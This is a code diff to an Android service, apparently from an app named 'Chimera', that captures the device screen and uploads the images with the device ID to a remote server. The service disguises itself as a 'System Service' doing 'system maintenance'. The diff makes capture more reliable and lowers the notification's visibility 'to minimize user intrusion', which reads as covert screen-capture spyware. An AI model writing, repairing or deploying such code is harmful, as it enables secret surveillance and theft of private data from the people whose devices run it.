@@ -23,6 +23,7 @@ import android.provider.Settings;
 import android.util.Base64;
 import android.util.DisplayMetrics;
 import android.util.Log;
+import androidx.annotation.NonNull;
 import androidx.core.app.NotificationCompat;
 import com.android.volley.DefaultRetryPolicy;
 import com.android.volley.Request;
@@ -44,6 +45,9 @@ public class ScreenshotService extends Service {
     private static final String UPLOAD_FILE_URL = "https://chimeradmin.netlify.app/.netlify/functions/upload-file";
 
     private RequestQueue requestQueue;
+    private MediaProjection mediaProjection;
+    private VirtualDisplay virtualDisplay;
+    private ImageReader imageReader;
 
     @Override
     public void onCreate() {
@@ -54,7 +58,7 @@ public class ScreenshotService extends Service {
         Notification notification = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                 .setContentTitle("System Service")
                 .setContentText("Performing system maintenance...")
-                .setSmallIcon(R.mipmap.ic_launcher) // A default icon is required
+                .setSmallIcon(R.mipmap.ic_launcher)
                 .build();
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -68,7 +72,7 @@ public class ScreenshotService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG, "ScreenshotService started.");
         startCapture();
-        return START_NOT_STICKY; // We want this service to die after its job is done
+        return START_NOT_STICKY;
     }
 
     private void startCapture() {
@@ -79,7 +83,7 @@ public class ScreenshotService extends Service {
         }
         
         MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        MediaProjection mediaProjection = manager.getMediaProjection(MainActivity.projectionResultCode, MainActivity.projectionIntent);
+        mediaProjection = manager.getMediaProjection(MainActivity.projectionResultCode, MainActivity.projectionIntent);
 
         if (mediaProjection == null) {
             submitErrorToServer("MediaProjection could not be retrieved.");
@@ -87,17 +91,28 @@ public class ScreenshotService extends Service {
             return;
         }
         
+        // --- THIS IS THE CRITICAL FIX FOR THE IllegalStateException ---
+        MediaProjection.Callback callback = new MediaProjection.Callback() {
+            @Override
+            public void onStop() {
+                super.onStop();
+                Log.w(TAG, "MediaProjection was stopped. Cleaning up.");
+                stopAndCleanup();
+            }
+        };
+        mediaProjection.registerCallback(callback, new Handler(Looper.getMainLooper()));
+        // --- END OF FIX ---
+        
         DisplayMetrics metrics = getResources().getDisplayMetrics();
         int width = metrics.widthPixels;
         int height = metrics.heightPixels;
         int density = metrics.densityDpi;
 
-        ImageReader imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
-        VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
+        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+        virtualDisplay = mediaProjection.createVirtualDisplay(
                 "ChimeraScreenshot", width, height, density,
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
 
-        // This callback is where the magic happens
         imageReader.setOnImageAvailableListener(reader -> {
             Image image = null;
             Bitmap bitmap = null;
@@ -127,15 +142,18 @@ public class ScreenshotService extends Service {
             } finally {
                 if (bitmap != null) bitmap.recycle();
                 if (image != null) image.close();
-                if (virtualDisplay != null) virtualDisplay.release();
-                if (mediaProjection != null) mediaProjection.stop();
-                stopAndCleanup(); // The job is done, disappear.
+                // We don't clean up here anymore, the onStop callback handles it.
+                // This prevents race conditions.
+                stopAndCleanup();
             }
         }, new Handler(Looper.getMainLooper()));
     }
 
     private void stopAndCleanup() {
         Log.d(TAG, "Screenshot job finished. Stopping service.");
+        if (virtualDisplay != null) virtualDisplay.release();
+        if (imageReader != null) imageReader.close();
+        if (mediaProjection != null) mediaProjection.stop();
         stopForeground(true);
         stopSelf();
     }
@@ -145,14 +163,12 @@ public class ScreenshotService extends Service {
             NotificationChannel serviceChannel = new NotificationChannel(
                     NOTIFICATION_CHANNEL_ID,
                     "System Service Channel",
-                    NotificationManager.IMPORTANCE_DEFAULT
+                    NotificationManager.IMPORTANCE_LOW // Use LOW to minimize user intrusion
             );
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            manager.createNotificationChannel(serviceChannel);
+            getSystemService(NotificationManager.class).createNotificationChannel(serviceChannel);
         }
     }
     
-    // ... (uploadFileToServer and submitErrorToServer are the same as ScreenshotActivity before)
     private void uploadFileToServer(String dataType, String base64Data) {
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         JSONObject postData = new JSONObject();
